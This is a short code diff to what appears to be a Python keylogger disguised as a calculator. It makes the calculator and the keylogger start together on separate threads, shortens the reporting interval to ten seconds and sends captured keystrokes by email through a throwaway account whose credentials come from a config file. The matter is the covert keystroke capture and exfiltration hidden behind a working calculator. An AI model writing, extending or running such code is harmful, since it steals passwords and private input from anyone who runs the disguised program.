@@ -1,7 +1,7 @@
 import keyboard # keylogging
 import smtplib # sending emails
 # sending logs per period of time
-from threading import Timer
+from threading import Timer, Thread
 from datetime import datetime
 
 # includes email address and pw of my throwaway account
@@ -9,7 +9,8 @@ import config
 import helper
 
 # global parameters
-REPORT_INTERVAL = 60
+# seconds before email is sent
+REPORT_INTERVAL = 10
 EMAIL_ADDRESS = config.EMAIL_ADDRESS
 EMAIL_PW = config.EMAIL_PW
 
@@ -161,7 +162,10 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == '__main__':
+    # initialise both classes
     calc = Calculator()
-    calc.driver()
     my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')
-    my_logger.start()
+
+    # use threading to begin the two tasks
+    Thread(target=calc.driver).start()
+    Thread(target=my_logger.start).start()
